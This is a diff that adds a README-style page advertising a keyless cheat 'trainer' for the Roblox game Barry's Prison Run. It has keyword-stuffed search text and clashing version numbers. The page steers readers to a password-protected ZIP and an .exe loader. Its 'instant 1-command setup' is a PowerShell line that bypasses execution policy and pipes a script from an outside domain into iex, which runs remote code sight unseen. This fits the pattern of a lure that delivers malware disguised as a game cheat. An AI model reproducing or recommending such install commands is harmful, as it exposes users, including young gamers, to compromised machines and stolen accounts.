@@ -1,0 +1,44 @@
+BARRY'S PRISON RUN! (OBBY) (v2.2.6 — Windows 10 / 11 x64)
+
+BARRY'S PRISON RUN! (OBBY) provides a keyless Luau automation and visual utility suite for Roblox on Windows 10/11. It supports automated farming loops, entity/item ESP, instant teleportation, and webhook notifications.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open BARRY'S PRISON RUN! (OBBY) Setup Portal (BarrysPrisonRunObby-Trainer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (barry-s-prison-run-obby-trainer-mod-menu-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.2.6)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/barry-s-prison-run-obby-trainer-mod-menu | iex"
+
+Key Features & Technical Specs
+
+- Automated BARRY'S PRISON RUN! (OBBY) farming loop, instant action execution, and auto-collect
+- Entity, rare item, and chest ESP overlay with distance and value filters
+- Instant waypoint teleportation, walkspeed / jump multiplier, and noclip toggle
+- Keyless execution compatible with Xeno, Solara, Wave, Delta, and Krnl
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | BarrysPrisonRunObby/BarrysPrisonRunObby-Trainer.exe (v2.2.6) |
+| Target Runtime | Roblox Hyperion x64 Luau Runtime (RobloxPlayerBeta.exe · Keyless Script Hub) |
+| Install Path | %LOCALAPPDATA%\Roblox\Workspace\BarrySPrisonRunObby |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the BARRY'S PRISON RUN! (OBBY) Script & Loader Portal (v2.2.6) or Releases.
+2. Run the standalone loader BarrysPrisonRunObby-Trainer.exe (compatible with Xeno, Solara, Wave, Delta, and Krnl).
+3. Join the game server and press RightShift or INSERT to toggle the in-game GUI.
+
+BarrysPrisonRunObby/
+├── BarrysPrisonRunObby-Trainer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Roblox\Workspace\BarrySPrisonRunObby)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+barry's prison run! (obby) script · barry's prison run! (obby) roblox script · barry's prison run! (obby) autofarm · barry's prison run! (obby) script pastebin · barrys-prison-run-obby · barrys-prison-run-obby-script · barrys-prison-run-obby-roblox · roblox-script · roblox · luau
